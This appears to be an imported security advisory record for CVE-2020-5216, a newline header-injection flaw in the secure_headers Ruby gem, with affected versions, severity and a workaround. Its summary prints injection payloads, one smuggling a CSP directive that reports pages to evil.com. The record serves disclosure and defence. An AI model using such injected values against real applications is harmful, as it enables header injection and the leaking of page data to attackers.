advisory_id: gems/secure_headers/CVE-2020-5216
datasource_id: ruby_importer_v2/gems/secure_headers/CVE-2020-5216
datasource_url: https://github.com/rubysec/ruby-advisory-db/blob/master/gems/secure_headers/CVE-2020-5216.yml
aliases:
  - CVE-2020-5216
  - GHSA-w978-rmpf-qmwg
summary: |
  secure_headers header injection due to newline
  If user-supplied input was passed into append/override_content_security_policy_directives,
  a newline could be injected leading to limited header injection.

  Upon seeing a newline in the header, rails will silently create a new Content-Security-Policy
  header with the remaining value of the original string. It will continue to create new headers
  for each newline.

  e.g.

  ```
  override_content_security_directives(script_src: ['mycdn.com', "\ninjected\n"])
  ```

  would result in

  ```
  Content-Security-Policy: ... script-src: mycdn.com
  Content-Security-Policy: injected
  Content-Security-Policy: rest-of-the-header
  ```

  CSP supports multiple headers and all policies must be satisfied for execution to occur, but a malicious value that reports the current page is fairly trivial:

  ```
  override_content_security_directives(script_src: ["mycdn.com", "\ndefault-src 'none'; report-uri evil.com"])
  ```

  ```
  Content-Security-Policy: ... script-src: mycdn.com
  Content-Security-Policy: default-src 'none'; report-uri evil.com
  Content-Security-Policy: rest-of-the-header
  ```

  Workarounds
  ```
  override_content_security_policy_directives(:frame_src, [user_input.gsub("\n", " ")])
  ```
impacted_packages:
  - purl: pkg:gem/secure_headers
    affected_versions:
    fixed_versions: vers:gem/>=3.9|<4
    fixed_in_commits: []
    introduced_in_commits: []
  - purl: pkg:gem/secure_headers
    affected_versions:
    fixed_versions: vers:gem/>=5.2|<6
    fixed_in_commits: []
    introduced_in_commits: []
  - purl: pkg:gem/secure_headers
    affected_versions:
    fixed_versions: vers:gem/>=6.3.0
    fixed_in_commits: []
    introduced_in_commits: []
severities:
  - score: '4.4'
    scoring_system: cvssv3
    scoring_elements:
    published_at: None
    url:
weaknesses: []
references:
  - url: https://github.com/twitter/secure_headers/security/advisories/GHSA-w978-rmpf-qmwg
    reference_type:
    reference_id:
